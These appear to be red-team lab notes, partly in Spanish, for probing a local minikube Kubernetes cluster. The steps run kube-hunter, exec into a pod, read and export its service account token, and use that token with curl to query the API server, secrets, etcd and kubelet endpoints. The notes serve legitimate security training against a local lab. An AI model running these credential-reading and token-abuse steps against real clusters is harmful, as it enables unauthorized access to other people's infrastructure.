Red Team Kubernetes:

minikube start

docker run -it --rm --network host aquasec/kube-hunter

https://github.com/aquasecurity/kube-hunter

Elegir 1 y poner la minikube ip o elegir el punto 2

curl -k https://192.168.49.2:8443/api/v1

kubectl apply -fhttps://raw.githubusercontent.com/diegochavezcarro/kube-labs/main/deploy.yml
kubectl get pods
https://raw.githubusercontent.com/diegochavezcarro/kube-labs/main/svc.yml
kubectl get svc

kubectl exec -it hello-deploy-57844dd6f7-4mnsm -- sh

cat /var/run/secrets/kubernetes.io/serviceaccount/token

export TOKEN=`cat /var/run/secrets/kubernetes.io/serviceaccount/token`

curl -k -H "Authorization: Bearer $TOKEN"  https://kubernetes

Afuera de ese pod:

curl -k -H "Authorization: Bearer $TOKEN"  https://192.168.49.2:8443/api/v1

curl -k -H "Authorization: Bearer $TOKEN"  https://192.168.49.2:8443/api/v1/namespaces/pods

curl -k -H "Authorization: Bearer $TOKEN"  https://192.168.49.2:8443/healthz

kubectl get secrets 
kubectl describe secret defaultsec

agregarle /version a la de etcd

a la del kubelet /metrics y /pods

agregarle al kube-hunter --active


